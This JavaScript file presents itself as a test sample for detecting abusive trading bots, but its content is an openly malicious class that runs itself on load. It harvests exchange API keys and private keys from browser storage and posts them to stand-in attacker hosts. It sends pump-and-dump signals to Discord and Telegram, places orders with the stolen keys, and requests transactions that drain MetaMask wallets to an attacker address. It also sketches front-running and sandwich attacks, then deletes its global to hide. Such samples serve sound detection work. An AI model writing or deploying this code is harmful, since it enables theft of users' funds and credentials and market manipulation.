// JavaScript Trading Bot Abuse Test Sample
// This file contains patterns that should trigger trading bot abuse detection

// Fake trading bot with malicious patterns
class TradingBotAbuse {
    constructor() {
        this.apiKeys = [];
        this.stolenCredentials = [];
        this.pumpTargets = [];
    }
    
    // Harvest API keys from browser storage
    harvestApiKeys() {
        const binanceKey = localStorage.getItem('binance_api_key');
        const coinbaseKey = localStorage.getItem('coinbase_api_key');
        const krakenKey = localStorage.getItem('kraken_api_key');
        
        // Also check session storage
        const sessionKeys = [
            sessionStorage.getItem('trading_api_key'),
            sessionStorage.getItem('exchange_secret'),
            sessionStorage.getItem('private_key')
        ];
        
        // Store harvested keys
        this.apiKeys = [binanceKey, coinbaseKey, krakenKey, ...sessionKeys].filter(Boolean);
        
        // Send to external server
        this.exfiltrateData('api_keys', this.apiKeys);
    }
    
    // Pump and dump coordination
    initializePumpDump() {
        const targets = ['SHIB', 'DOGE', 'SAFEMOON'];
        const discordWebhook = 'https://discord.com/api/webhooks/pump-signal';
        const telegramBot = 'https://api.telegram.org/bot123456:token/sendMessage';
        
        targets.forEach(symbol => {
            this.coordinatePump(symbol, discordWebhook, telegramBot);
        });
    }
    
    // Coordinate pump scheme
    coordinatePump(symbol, discordUrl, telegramUrl) {
        const pumpMessage = {
            signal: 'pump',
            symbol: symbol,
            target_price: '1000% gain guaranteed',
            urgency: 'limited time offer',
            manipulation: 'buy volume coordination required'
        };
        
        // Send pump signal to Discord
        fetch(discordUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(pumpMessage)
        });
        
        // Send to Telegram
        fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: '@pump_group',
                text: `🚀 PUMP SIGNAL: ${symbol} - 100% guaranteed returns!`
            })
        });
    }
    
    // Unauthorized trading with stolen credentials
    executeUnauthorizedTrades() {
        this.apiKeys.forEach(apiKey => {
            if (apiKey) {
                this.placeFakeOrders(apiKey);
            }
        });
    }
    
    // Place fake trading orders
    placeFakeOrders(apiKey) {
        const orders = [
            {
                side: 'buy',
                symbol: 'BTCUSDT',
                quantity: '999999',
                price: '1',
                type: 'limit'
            },
            {
                side: 'sell',
                symbol: 'ETHUSDT', 
                quantity: '888888',
                price: '999999',
                type: 'market'
            }
        ];
        
        orders.forEach(order => {
            fetch('https://api.binance.com/api/v3/order', {
                method: 'POST',
                headers: {
                    'X-MBX-APIKEY': apiKey,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(order)
            });
        });
    }
    
    // Wallet manipulation
    manipulateWallets() {
        const walletAddresses = this.extractWalletAddresses();
        
        walletAddresses.forEach(address => {
            this.attemptWalletDrain(address);
        });
    }
    
    // Extract wallet addresses from browser
    extractWalletAddresses() {
        const addresses = [];
        
        // Check localStorage for wallet data
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            
            if (key.includes('wallet') || key.includes('address') || key.includes('private_key')) {
                addresses.push(value);
            }
        }
        
        // Check for MetaMask or other wallet extensions
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.request({ method: 'eth_accounts' })
                .then(accounts => {
                    addresses.push(...accounts);
                    this.exfiltrateData('wallet_addresses', accounts);
                });
        }
        
        return addresses;
    }
    
    // Attempt to drain wallet
    attemptWalletDrain(address) {
        const drainTransaction = {
            from: address,
            to: '0x1234567890abcdef1234567890abcdef12345678', // Attacker address
            value: '999999999999999999', // Max amount
            gas: '21000'
        };
        
        // Try to send transaction
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [drainTransaction]
            });
        }
    }
    
    // MEV bot with excessive gas
    runMEVBot() {
        const targets = ['uniswap', 'pancakeswap', 'compound'];
        
        targets.forEach(target => {
            this.frontrunTransaction(target);
            this.sandwichAttack(target);
        });
    }
    
    // Frontrunning attack
    frontrunTransaction(exchange) {
        const transaction = {
            to: exchange,
            data: '0x123456789', // Malicious contract call
            gasPrice: '1000000000000', // Extremely high gas price
            gasLimit: '999999'
        };
        
        // Submit frontrunning transaction
        this.submitTransaction(transaction);
    }
    
    // Sandwich attack
    sandwichAttack(exchange) {
        const attackTransactions = [
            { type: 'frontrun', gasPrice: '999999999' },
            { type: 'victim_tx', gasPrice: 'normal' },
            { type: 'backrun', gasPrice: '999999998' }
        ];
        
        attackTransactions.forEach(tx => {
            this.submitTransaction(tx);
        });
    }
    
    // Data exfiltration
    exfiltrateData(type, data) {
        const payload = {
            type: type,
            data: data,
            timestamp: Date.now(),
            victim: window.location?.hostname || 'nodejs_victim'
        };
        
        // Send to multiple exfiltration endpoints
        const endpoints = [
            'https://evil-collector.com/data',
            'https://malicious-server.net/collect',
            'https://127.0.0.1:8080/steal'
        ];
        
        endpoints.forEach(endpoint => {
            fetch(endpoint, {
                method: 'POST',
                body: JSON.stringify(payload),
                mode: 'no-cors'
            });
        });
    }
    
    // Initialize all malicious activities
    init() {
        console.log('Starting trading bot analysis...');
        
        // Start malicious activities
        this.harvestApiKeys();
        this.initializePumpDump();
        this.executeUnauthorizedTrades();
        this.manipulateWallets();
        this.runMEVBot();
        
        console.log('Trading bot operations completed');
    }
}

// Start the malicious trading bot
const maliciousBot = new TradingBotAbuse();
maliciousBot.init();

// Hide the malicious activity
delete window.TradingBotAbuse;